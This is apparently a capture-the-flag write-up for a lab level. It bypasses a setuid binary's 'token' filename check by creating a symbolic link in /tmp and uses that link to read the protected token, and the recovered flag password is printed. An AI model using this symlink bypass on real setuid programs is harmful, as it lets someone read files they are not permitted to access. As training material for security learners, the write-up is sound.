# Level 08 - This Is Not a Token

## Home content

- Here we have a level08 executable and a token file who cannot be read.

```
sh
$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

## `level08` executable

- The executable refuse to read token

```sh
$ ./level08
./level08 [file to read]
$ ./level08 token
You may not access 'token'
$ echo "testing" > /tmp/test
$ ./level08 /tmp/test
testing
```

- If we decompile the executable, we understand that it refuses to read any file named `token`:

```c
if (strstr(argv[1], "token") != 0) {
	printf("You may not access '%s'\n", argv[1]);
	exit(1);
}
```

## This Is Not a Token

- A way to bypass this restriction is to create a symbolic link.
- As we do not have write rights in our folder, let this time use the `/tmp/` folder.

```sh
$ ln -s /home/user/level08/token /tmp/the_key
$ ./level08 /tmp/the_key
quif5eloekouj29ke0vouxean
```

# Flag

- `flag08` password (flag): `quif5eloekouj29ke0vouxean`.
